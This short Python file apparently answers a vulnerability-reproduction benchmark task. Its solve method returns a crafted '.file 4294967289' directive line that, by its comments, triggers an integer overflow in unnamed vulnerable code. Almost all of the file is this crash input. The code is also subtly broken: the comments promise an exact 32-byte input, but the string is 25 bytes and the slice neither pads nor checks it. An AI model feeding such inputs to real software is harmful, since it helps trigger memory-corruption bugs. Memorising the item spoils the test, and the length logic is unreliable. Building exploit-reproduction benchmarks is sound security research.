import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Ground-truth length is 32 bytes
        # Format: .file 4294967289 "xxx.c"
        # 4294967289 = 2^32 - 7 = 0xFFFFFFF9
        # This value triggers integer overflow in the vulnerable code
        poc = b'.file 4294967289 "xxx.c"\n'
        # Ensure exact length of 32 bytes
        return poc[:32]